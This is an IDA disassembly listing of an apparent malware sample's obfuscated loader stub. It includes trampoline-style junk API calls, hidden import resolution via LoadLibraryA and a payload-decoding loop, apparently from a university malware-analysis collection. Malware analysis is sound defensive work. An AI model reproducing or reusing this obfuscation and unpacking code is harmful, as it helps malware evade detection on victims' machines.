;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0DA062CF70DC75DD2BB7EE0C2759A114
; Input	CRC32 :	61FC2402

; File Name   :	C:\Users\farhadi\Desktop\509_Malware\0da062cf70dc75dd2bb7ee0c2759a114
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 000017CC (   6092.)
; Section size in file		: 00001800 (   6144.)
; Offset to raw	data for section: 0005E400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401090	proc near		; CODE XREF: sub_40147C+18p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		mov	ecx, offset aMsyuvDll ;	"					"...
		mov	[ecx+90h], eax
		push	ecx
		push	esi
		push	edi
		push	edi
		call	sub_40119C
		add	esp, 0Ch
		pop	ecx
		push	ecx
		db	3Eh
		call	sub_4010BE
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401090	endp


; =============== S U B	R O U T	I N E =======================================


sub_4010BE	proc near		; CODE XREF: sub_401090+21p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	0
		db	3Eh
		call	sub_4010D2
		mov	eax, ds:GetDC
		jmp	eax
sub_4010BE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4010D2	proc near		; CODE XREF: sub_4010BE+7p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_4010D2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 63h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401140	proc near		; CODE XREF: start+3Fj
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		lea	ecx, dword_4BA3AC
		and	[ecx-2C0h], ebx
		push	ecx
		push	edi
		push	dword ptr [ecx+2F4h]
		push	dword ptr [ecx+224h]
		push	dword ptr [ecx+208h]
		call	sub_401A7C
		add	esp, 10h
		pop	ecx
		push	ecx
		push	0
		db	3Eh
		call	sub_401181
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401140	endp


; =============== S U B	R O U T	I N E =======================================


sub_401181	proc near		; CODE XREF: sub_401140+34p
		pop	ecx
		call	ecx
		pop	ecx
		mov	ebx, offset GetModuleHandleA
		mov	ebx, [ebx]
		push	ebx
		push	dword ptr [ecx+3Ch]
		pop	eax
		call	eax
		add	esp, 20h
		pop	ebp
		retn	0
sub_401181	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40119C	proc near		; CODE XREF: sub_401090+17p

var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	ebx, dword_4BA0A4
		sub	[ebp+var_14], 6775h
		push	ebx
		push	eax
		push	dword ptr [ebx+3ECh]
		call	sub_401FBC
		add	esp, 8
		pop	ebx
		mov	esi, 0
		push	esi
		db	3Eh
		call	sub_4011D5
		mov	eax, ds:CloseHandle
		jmp	eax
sub_40119C	endp


; =============== S U B	R O U T	I N E =======================================


sub_4011D5	proc near		; CODE XREF: sub_40119C+2Cp
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_4011EB
		mov	eax, ds:lstrlenA
		jmp	eax
sub_4011D5	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4011EB	proc near		; CODE XREF: sub_4011D5+9p
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_4011EB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 63h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401258	proc near		; CODE XREF: sub_401838+23p
		mov	edi, edi
		push	ebp

loc_40125B:				; CODE XREF: sub_401258+13j
		mov	ebp, esp
		sub	esp, 50h
		mov	edi, offset dword_4BA138
		cmp	edi, 58BEh
		jbe	short loc_40125B
		push	edi
		push	edx
		push	dword ptr [edi+210h]
		call	sub_401A30
		add	esp, 8
		pop	edi
		push	0
		db	3Eh
		call	sub_40128D
		mov	eax, ds:SetEvent
		jmp	eax
sub_401258	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40128D	proc near		; CODE XREF: sub_401258+28p
		pop	ecx
		call	ecx
		push	0
		db	3Eh
		call	sub_40129F
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_40128D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40129F	proc near		; CODE XREF: sub_40128D+5p
		pop	ecx
		call	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_40129F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4012AC	proc near		; CODE XREF: sub_401AA3+Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		lea	ebx, dword_4BA218
		xor	eax, edi
		push	ebx
		push	dword ptr [ebx+20Ch]
		push	dword ptr [ebx+0A4h]
		push	dword ptr [ebx+108h]
		call	sub_401B70
		add	esp, 0Ch
		pop	ebx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_4012EB
		mov	eax, ds:Sleep
		jmp	eax
sub_4012AC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4012EB	proc near		; CODE XREF: sub_4012AC+32p
		pop	ecx
		call	ecx
		mov	eax, 0
		push	eax
		db	3Eh
		call	sub_401301
		mov	eax, ds:PulseEvent
		jmp	eax
sub_4012EB	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401301	proc near		; CODE XREF: sub_4012EB+9p
		pop	ecx
		call	ecx
		add	esp, 20h
		pop	ebp
		retn	0
sub_401301	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40130C	proc near		; CODE XREF: sub_40138C+21p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		mov	eax, offset dword_4BA118
		add	ecx, [eax+2C8h]
		push	eax
		push	ecx
		push	edx
		push	edi
		call	sub_40155C
		add	esp, 0Ch
		pop	eax
		push	eax
		push	0
		db	3Eh
		call	sub_40133C
		mov	eax, ds:GetDC
		jmp	eax
sub_40130C	endp


; =============== S U B	R O U T	I N E =======================================


sub_40133C	proc near		; CODE XREF: sub_40130C+23p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	0
		db	3Eh
		call	sub_401350
		mov	eax, ds:SetLastError
		jmp	eax
sub_40133C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401350	proc near		; CODE XREF: sub_40133C+7p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 44h
		pop	ebp
		retn	0
sub_401350	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40138C	proc near		; CODE XREF: sub_401F53+17p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	ecx, [edi+278h]
		mov	dword ptr [ecx-30Ch], 0FFFFFFB7h
		push	ecx
		push	eax
		push	dword ptr [ecx+37Ch]
		push	esi
		call	sub_40130C
		add	esp, 0Ch
		pop	ecx
		push	ecx

loc_4013B7:				; CODE XREF: sub_4013CB+5j
		lea	edi, [ecx-30Ch]
		push	edi
		db	3Eh
		call	sub_4013CB
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_40138C	endp


; =============== S U B	R O U T	I N E =======================================


sub_4013CB	proc near		; CODE XREF: sub_40138C+32p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short loc_4013B7
		pop	ecx
		push	ecx
		db	3Eh
		call	sub_4013E1
		mov	eax, ds:GetTickCount
		jmp	eax
sub_4013CB	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4013E1	proc near		; CODE XREF: sub_4013CB+9p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_4013E1	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4013EC	proc near		; CODE XREF: sub_401678+1Fp

var_10		= dword	ptr -10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	ecx, [edi+68h]
		and	[ebp+var_10], 4C73h
		push	ecx
		push	dword ptr [ecx+1E0h]
		push	edx
		push	edi
		push	dword ptr [ecx+0A0h]
		call	sub_401BF0
		add	esp, 10h
		pop	ecx
		push	ecx
		push	0
		db	3Eh
		call	sub_401426
		mov	eax, ds:GetDC
		jmp	eax
sub_4013EC	endp


; =============== S U B	R O U T	I N E =======================================


sub_401426	proc near		; CODE XREF: sub_4013EC+2Dp
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_40143E
		mov	eax, ds:SetEvent
		jmp	eax
sub_401426	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40143E	proc near		; CODE XREF: sub_401426+Bp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_40143E	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40147C	proc near		; CODE XREF: sub_401CEB+Fp

var_3C		= dword	ptr -3Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 58h
		lea	esi, [ebx+0A0h]
		add	[ebp+var_3C], edi
		push	esi
		push	eax
		push	eax
		push	ebx
		push	dword ptr [esi+50h]
		call	sub_401090
		add	esp, 10h
		pop	esi
		push	0
		db	3Eh
		call	sub_4014AC
		mov	eax, ds:PulseEvent
		jmp	eax
sub_40147C	endp


; =============== S U B	R O U T	I N E =======================================


sub_4014AC	proc near		; CODE XREF: sub_40147C+23p
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_4014C2
		mov	eax, ds:SetFocus
		jmp	eax
sub_4014AC	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4014C2	proc near		; CODE XREF: sub_4014AC+9p
		pop	ecx
		call	ecx
		add	esp, 58h
		pop	ebp
		retn	0
sub_4014C2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40155C	proc near		; CODE XREF: sub_40130C+17p

var_6C		= dword	ptr -6Ch

		mov	edi, edi
		push	ebp

loc_40155F:				; CODE XREF: sub_40155C+Dj
		mov	ebp, esp
		sub	esp, 58h
		cmp	eax, 2136h
		jb	short loc_40155F
		mov	edx, offset dword_4BA08C
		push	edx
		push	6B4h
		push	6B4h
		push	40001h
		mov	ecx, 0B9C59E31h
		push	dword ptr [ecx+467A9213h]
		sub	[esp+6Ch+var_6C], 2
		mov	ecx, offset LoadLibraryA
		pop	dword ptr [ecx]
		db	3Eh
		call	sub_4015A3
		mov	eax, ds:LoadLibraryA
		jmp	eax
sub_40155C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4015A3	proc near		; CODE XREF: sub_40155C+3Ap

arg_0		= dword	ptr  4

		pop	ecx
		call	ecx
		xchg	eax, [esp-4+arg_0]
		mov	edx, eax
		pop	dword ptr [edx+35Ch]
		mov	esi, [edx+35Ch]
		mov	ebx, esi
		sub	esi, esi
		dec	esi
		and	esi, offset word_40210A
		mov	eax, 56A92219h
		push	dword ptr [esi]
		pop	dword ptr [ebx]
		add	esi, 1
		add	ebx, 1
		xor	ecx, ecx
		add	ecx, 6B4h

loc_4015D9:				; CODE XREF: sub_4015A3+55j
		xor	edi, edi
		push	dword ptr [esi]
		adc	[esp-4+arg_0], eax
		pop	dword ptr [ebx+edi*2]
		sub	eax, eax
		sbb	eax, [esi+eax*4]
		neg	eax
		shr	eax, 1
		add	esi, 4
		add	ebx, 4
		sub	ecx, 4
		cmp	ecx, 0
		jnz	short loc_4015D9
		push	edx
		push	0
		db	3Eh
		call	sub_40160A
		mov	eax, ds:CloseHandle
		jmp	eax
sub_4015A3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40160A	proc near		; CODE XREF: sub_4015A3+5Ap
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 58h
		pop	ebp
		retn	0
sub_40160A	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 63h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401678	proc near		; CODE XREF: sub_40193A+Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		mov	edi, offset dword_4BA0B4
		sub	eax, 2Ch
		push	edi
		push	eax
		push	dword ptr [edi+35Ch]
		push	eax
		push	dword ptr [edi+1E8h]
		call	sub_4013EC
		add	esp, 10h
		pop	edi
		push	0
		db	3Eh
		call	sub_4016AF
		mov	eax, ds:PulseEvent
		jmp	eax
sub_401678	endp


; =============== S U B	R O U T	I N E =======================================


sub_4016AF	proc near		; CODE XREF: sub_401678+2Ap
		pop	ecx
		call	ecx
		push	0
		db	3Eh
		call	sub_4016C1
		mov	eax, ds:CloseHandle
		jmp	eax
sub_4016AF	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4016C1	proc near		; CODE XREF: sub_4016AF+5p
		pop	ecx
		call	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_4016C1	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0F1h	dup(90h)

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_4		= dword	ptr -4

		mov	ecx, offset lstrlenA
		push	0

loc_4017C3:				; CODE XREF: start+49j
		pop	eax
		call	ds:CreateThread
		add	esp, 0FFFFFFE8h
		xor	eax, eax
		lea	eax, ds:4BA100h[eax*4]
		lea	ecx, [eax+5]
		add	byte ptr [ecx],	4
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	3Ch
		add	[esp+4+var_4], eax
		pop	ecx
		mov	ecx, [ecx]
		sub	ecx, 0FFFFFFAFh
		mov	eax, [eax+ecx]
		shr	eax, 4
		mov	cl, 25h
		cmp	al, cl
		pusha
		jg	short near ptr loc_4017FB+5

loc_4017FB:				; CODE XREF: start+3Dj
		jb	sub_401140
		popa
		call	dword ptr [esp+0]
		jb	short loc_4017C3
		cmp	[eax-6F6F6F70h], dl
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
start		endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401838	proc near		; CODE XREF: sub_401C74+1Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		mov	esi, offset dword_4BA340
		sub	edx, 5677h
		push	esi
		push	dword ptr [esi+58h]
		push	dword ptr [esi+1C0h]
		push	dword ptr [esi+248h]
		call	sub_401258
		add	esp, 0Ch
		pop	esi
		push	0
		db	3Eh
		call	sub_401873
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401838	endp


; =============== S U B	R O U T	I N E =======================================


sub_401873	proc near		; CODE XREF: sub_401838+2Ep
		pop	ecx
		call	ecx
		push	0
		db	3Eh
		call	sub_401885
		mov	eax, ds:SetEvent
		jmp	eax
sub_401873	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401885	proc near		; CODE XREF: sub_401873+5p
		pop	ecx
		call	ecx
		add	esp, 34h
		pop	ebp
		retn	0
sub_401885	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401890	proc near		; CODE XREF: sub_401DA8+2Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		lea	edi, [edx+330h]
		or	dword ptr [edi+18h], 0FFFFFA8Fh
		mov	esi, 0
		push	esi
		db	3Eh
		call	sub_4018B8
		mov	eax, ds:SetEvent
		jmp	eax
sub_401890	endp


; =============== S U B	R O U T	I N E =======================================


sub_4018B8	proc near		; CODE XREF: sub_401890+1Bp
		pop	ecx
		call	ecx
		push	edi
		push	dword ptr [edi+1A4h]
		push	ebx
		call	sub_401914
		add	esp, 8
		pop	edi
		db	3Eh
		call	sub_4018D9
		mov	eax, ds:GetTickCount
		jmp	eax
sub_4018B8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4018D9	proc near		; CODE XREF: sub_4018B8+14p
		pop	ecx
		call	ecx
		add	esp, 34h
		pop	ebp
		retn	0
sub_4018D9	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401914	proc near		; CODE XREF: sub_4018B8+Bp

var_24		= dword	ptr -24h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		lea	ecx, [edi-1A4h]
		xor	[ebp+var_24], 0FFFFFFCBh
		push	ecx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_40193A
		mov	eax, ds:PulseEvent
		jmp	eax
sub_401914	endp


; =============== S U B	R O U T	I N E =======================================


sub_40193A	proc near		; CODE XREF: sub_401914+19p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	edx
		push	esi
		push	dword ptr [ecx+88h]
		call	sub_401678
		add	esp, 0Ch
		pop	ecx
		push	ecx
		mov	edi, 0
		push	edi
		db	3Eh
		call	sub_401964
		mov	eax, ds:PulseEvent
		jmp	eax
sub_40193A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401964	proc near		; CODE XREF: sub_40193A+1Dp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 48h
		pop	ebp
		retn	0
sub_401964	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C1h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401A30	proc near		; CODE XREF: sub_401258+1Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		mov	edx, offset dword_4BA11C
		xor	esi, ebx
		push	edx
		push	esi
		push	esi
		push	edi
		push	eax
		call	sub_401F30
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		db	3Eh
		call	sub_401A5D
		mov	eax, ds:LocalFree
		jmp	eax
sub_401A30	endp


; =============== S U B	R O U T	I N E =======================================


sub_401A5D	proc near		; CODE XREF: sub_401A30+20p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		db	3Eh
		call	sub_401A6F
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401A5D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401A6F	proc near		; CODE XREF: sub_401A5D+5p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 20h
		pop	ebp
		retn	0
sub_401A6F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401A7C	proc near		; CODE XREF: sub_401140+28p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		lea	edi, [ecx-1E8h]
		sbb	dword ptr [edi-128h], 0FFFF9A4Bh
		push	0
		db	3Eh
		call	sub_401AA3
		mov	eax, ds:PulseEvent
		jmp	eax
sub_401A7C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401AA3	proc near		; CODE XREF: sub_401A7C+1Ap
		pop	ecx
		call	ecx
		push	edi
		push	esi
		push	dword ptr [edi+0E8h]
		push	ecx
		call	sub_4012AC
		add	esp, 0Ch
		pop	edi
		lea	esi, [edi-1C4h]	; CODE XREF: sub_401ACC+5j
		push	esi
		db	3Eh
		call	sub_401ACC
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_401AA3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401ACC	proc near		; CODE XREF: sub_401AA3+1Cp
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_401AB8+1
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_401ACC	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401ADC	proc near		; CODE XREF: sub_401D41+Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		mov	edx, offset dword_4BA0A8
		mov	ebx, 0FFFFFF8Ah
		push	edx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_401B02
		mov	eax, ds:SetFocus
		jmp	eax
sub_401ADC	endp


; =============== S U B	R O U T	I N E =======================================


sub_401B02	proc near		; CODE XREF: sub_401ADC+19p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	dword ptr [edx+10Ch]
		push	dword ptr [edx+3B8h]
		push	esi
		push	dword ptr [edx+178h]
		call	sub_401C74
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		db	3Eh
		call	sub_401B33
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_401B02	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401B33	proc near		; CODE XREF: sub_401B02+24p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 40h
		pop	ebp
		retn	0
sub_401B33	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401B70	proc near		; CODE XREF: sub_4012AC+23p

var_20		= dword	ptr -20h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	edi, dword_4BA300
		adc	[ebp+var_20], 0FFFFFFF2h
		push	0
		db	3Eh
		call	sub_401B91
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401B70	endp


; =============== S U B	R O U T	I N E =======================================


sub_401B91	proc near		; CODE XREF: sub_401B70+14p
		pop	ecx
		call	ecx
		push	edi
		push	dword ptr [edi+204h]
		push	esi
		call	sub_401DA8
		add	esp, 8
		pop	edi
		push	0
		db	3Eh
		call	sub_401BB4
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401B91	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401BB4	proc near		; CODE XREF: sub_401B91+16p
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_401BB4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401BF0	proc near		; CODE XREF: sub_4013EC+21p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		lea	esi, dword_4BA28C
		xor	ebx, 333Eh
		mov	eax, 0
		push	eax
		db	3Eh
		call	sub_401C17
		mov	eax, ds:SetFocus
		jmp	eax
sub_401BF0	endp


; =============== S U B	R O U T	I N E =======================================


sub_401C17	proc near		; CODE XREF: sub_401BF0+1Ap
		pop	ecx
		call	ecx
		push	esi
		push	ecx
		push	edx
		push	dword ptr [esi+188h]
		push	edi
		call	sub_401CC4
		add	esp, 10h
		pop	esi
		db	3Eh
		call	sub_401C3A
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401C17	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401C3A	proc near		; CODE XREF: sub_401C17+16p
		pop	ecx
		call	ecx
		add	esp, 28h
		pop	ebp
		retn	0
sub_401C3A	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401C74	proc near		; CODE XREF: sub_401B02+18p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		mov	edi, offset dword_4BA3A4
		sub	ecx, 6Ah
		push	edi
		push	ecx
		push	dword ptr [edi+0BCh]
		push	dword ptr [edi+364h]
		call	sub_401838
		add	esp, 0Ch
		pop	edi
		db	3Eh
		call	sub_401CA8
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401C74	endp


; =============== S U B	R O U T	I N E =======================================


sub_401CA8	proc near		; CODE XREF: sub_401C74+27p
		pop	ecx
		call	ecx
		push	0
		db	3Eh
		call	sub_401CBA
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401CA8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401CBA	proc near		; CODE XREF: sub_401CA8+5p
		pop	ecx
		call	ecx
		add	esp, 28h
		pop	ebp
		retn	0
sub_401CBA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401CC4	proc near		; CODE XREF: sub_401C17+Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		lea	ebx, dword_4BA150
		or	edi, [ebx+228h]
		mov	esi, 0
		push	esi
		db	3Eh
		call	sub_401CEB
		mov	eax, ds:LocalFree
		jmp	eax
sub_401CC4	endp


; =============== S U B	R O U T	I N E =======================================


sub_401CEB	proc near		; CODE XREF: sub_401CC4+1Ap
		pop	ecx
		call	ecx
		push	ebx
		push	dword ptr [ebx+0ACh]
		push	dword ptr [ebx+0Ch]
		push	edi
		push	ecx
		call	sub_40147C
		add	esp, 10h
		pop	ebx
		mov	edx, 0
		push	edx
		db	3Eh
		call	sub_401D16
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401CEB	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401D16	proc near		; CODE XREF: sub_401CEB+1Ep
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_401D16	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401D20	proc near		; CODE XREF: sub_401FE1+11p

var_10		= dword	ptr -10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		lea	ecx, [eax-124h]
		sbb	ebx, [ebp+var_10]
		push	ecx
		push	0
		db	3Eh
		call	sub_401D41
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401D20	endp


; =============== S U B	R O U T	I N E =======================================


sub_401D41	proc near		; CODE XREF: sub_401D20+14p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+58h]
		push	dword ptr [ecx+3ECh]
		call	sub_401ADC
		add	esp, 8
		pop	ecx
		push	ecx
		mov	edi, 0
		push	edi
		db	3Eh
		call	sub_401D6C
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401D41	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401D6C	proc near		; CODE XREF: sub_401D41+1Ep
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_401D6C	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401DA8	proc near		; CODE XREF: sub_401B91+Bp

var_24		= dword	ptr -24h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	edx, [edi-2D4h]
		or	[ebp+var_24], 456h
		push	edx
		push	dword ptr [edx+280h]
		push	dword ptr [edx+330h]
		push	dword ptr [edx+2A0h]
		push	dword ptr [edx+220h]
		call	sub_401890
		add	esp, 10h
		pop	edx
		push	edx
		mov	ecx, 0
		push	ecx
		db	3Eh
		call	sub_401DF3
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401DA8	endp


; =============== S U B	R O U T	I N E =======================================


sub_401DF3	proc near		; CODE XREF: sub_401DA8+3Ep
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		db	3Eh
		call	sub_401E05
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401DF3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401E05	proc near		; CODE XREF: sub_401DF3+5p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 24h
		pop	ebp
		retn	0
sub_401E05	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 120h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F30	proc near		; CODE XREF: sub_401A30+14p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		mov	edi, offset dword_4BA094
		or	ebx, [edi-10h]
		mov	ebx, 0
		push	ebx
		db	3Eh
		call	sub_401F53
